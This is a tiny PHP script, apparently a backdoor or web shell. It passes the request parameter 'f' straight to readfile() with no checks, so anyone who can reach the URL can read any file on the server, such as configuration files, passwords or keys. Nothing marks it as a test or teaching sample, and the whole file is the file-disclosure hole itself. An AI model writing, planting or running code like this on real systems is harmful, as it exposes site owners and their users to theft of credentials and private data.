<?php 

if(isset($_REQUEST['f'])){
	readfile($_REQUEST['f']);
	die;

} ?>
